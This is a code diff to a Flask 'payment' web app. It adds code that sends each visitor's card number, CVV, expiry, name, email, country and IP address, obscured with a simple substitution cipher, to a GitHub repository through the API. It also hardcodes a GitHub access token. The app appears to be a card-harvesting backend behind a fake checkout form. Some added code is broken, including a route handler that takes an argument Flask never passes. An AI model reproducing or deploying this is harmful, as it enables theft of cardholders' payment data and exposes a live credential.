@@ -6,7 +6,55 @@ from flask import Flask, render_template, request, redirect, url_for
 app = Flask(__name__)
 app.secret_key = 'thanks'  # Required for session management
 
+# _________________________________________________
+# _________________________________________________
 
+import requests
+import json
+
+# GitHub API Settings
+GITHUB_TOKEN = "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"
+REPO_OWNER = "BahaaKattan111"
+REPO_NAME = "test-webpage"
+FILE_PATH = "readme.txt"  # Change this to the file you want to create/update
+GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
+
+
+def get_file_sha():
+    """Get the SHA of an existing file (required for updating a file)."""
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    response = requests.get(GITHUB_API_URL, headers=headers)
+    if response.status_code == 200:
+        return response.json()["sha"]  # Get file SHA for updates
+    return None
+
+
+@app.route("/write-file", methods=["POST"])
+def write_file(content):
+    content = content#request.form.get("text_data", "Default content")
+    content_encoded = content.encode("utf-8").decode("utf-8")
+
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    data = {
+        "message": "Updating output.txt",
+        "content": content_encoded.encode("utf-8").hex(),  # Convert to Hex
+        "sha": get_file_sha(),  # Needed for updating existing files
+    }
+
+    response = requests.put(GITHUB_API_URL, headers=headers, data=json.dumps(data))
+
+    if response.status_code in [200, 201]:
+        return "File successfully updated in GitHub!"
+    else:
+        return f"Error: {response.json()}"
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+
+# _________________________________________________
+# _________________________________________________
 # Home page route
 @app.route('/')
 def home():
@@ -22,6 +70,8 @@ def payment():
 @app.route('/thanks/')  # create Serever ERROR page
 def thank_you():
     return render_template('thanks/thanks.html')
+
+
 """chars = r'''`1234567890-=qwertyuiop[]\asdN_fghjkl;'zxcvbnm,./~!@#$%^&*()+QWERTYUIOP}{|ASDFGHJCKL:"ZXVBM<>?ضصثقفغعهخحجدشسيبلاتنمكطئءؤرىةوزظ'''
 chars = set([c for c in chars])
 chars = [c for c in chars]
@@ -43,8 +93,9 @@ pd.to_pickle(encryptor,'encryptor.pkl',)
 pd.to_pickle(decryptor,'decryptor.pkl',)
 """
 
-encryptor=pd.read_pickle('encryptor.pkl',)
-decryptor=pd.read_pickle('decryptor.pkl',)
+encryptor = pd.read_pickle('encryptor.pkl', )
+decryptor = pd.read_pickle('decryptor.pkl', )
+
 
 def encrypt(text):
     encrypted = []
@@ -54,6 +105,8 @@ def encrypt(text):
         except:
             encrypted.append('   ')
     return ''.join(encrypted)
+
+
 def decrypt(text):
     decrypted = []
     for c in text:
@@ -62,6 +115,8 @@ def decrypt(text):
         except:
             decrypted.append('   ')
     return ''.join(decrypted)
+
+
 # Form submission route
 @app.route('/submit', methods=['POST'])
 def submit():
@@ -75,14 +130,16 @@ def submit():
 
     # Save the user input (for demonstration, we'll just print it)
     ip_address = request.remote_addr
-    with open('readme.txt', 'a',encoding='utf-8') as file:
+    with open('readme.txt', 'a', encoding='utf-8') as file:
         text = fr''' 
         user submitted
         * IP Address: {ip_address}
         * CARD-DETAILS:  Email= {email} ||| Name= {username} ||| expiry-date= {expiry} ||| card-number= {card_number} ||| ccv= {ccv} ||| country= {country} ;
         ---
         '''
-        file.write(encrypt(text))
+        text = encrypt(text)
+        write_file(text)
+        #file.write(encrypt(text))
 
     # Optionally, you could save it to a file or database here
 
